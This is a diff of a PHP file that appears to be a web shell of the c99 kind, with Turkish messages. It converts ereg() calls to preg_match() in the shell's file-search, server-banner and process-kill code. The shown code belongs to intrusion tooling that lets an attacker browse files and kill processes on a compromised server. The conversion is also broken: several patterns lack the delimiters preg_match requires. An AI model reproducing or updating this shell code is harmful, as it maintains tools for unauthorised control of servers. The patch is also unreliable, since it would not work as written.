@@ -767,7 +767,7 @@ function ashfsearch($d)
  {
   if($f != "." && $f != "..")
   {
-   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== false) || ($a["name_regexp"] and ereg($a["name"],$f));
+   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== false) || ($a["name_regexp"] and preg_match($a["name"],$f));
    if (is_dir($d.$f))
    {
     $search_i_d++;
@@ -784,7 +784,7 @@ function ashfsearch($d)
       $r = @file_get_contents($d.$f);
       if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
       if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
-      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
+      if ($a["text_regexp"]) {$bool = preg_match($a["text"],$r);}
       else {$bool = strpos(" ".$r,$a["text"],1);}
       if ($a["text_not"]) {$bool = !$bool;}
       if ($bool) {$found[] = $d.$f; $found_f++;}
@@ -846,7 +846,7 @@ $sort = htmlspecialchars($sort);
 if (empty($sort)) {$sort = $sort_default;}
 $sort[1] = strtolower($sort[1]);
 $DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
-if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
+if (!preg_match("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
 $DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
 @ini_set("highlight.bg",$highlight_bg); //FFFFFF
 @ini_set("highlight.comment",$highlight_comment); //#FF8000
@@ -2298,7 +2298,7 @@ if ($act == "processes")
     if (posix_kill($pid,$sig)) {echo "Tamam.";}
     else {echo "Hata.";}
    }
-   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
+   while (preg_match("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
    $stack = explode("\n",$ret);
    $head = explode(" ",$stack[0]);
    unset($stack[0]);
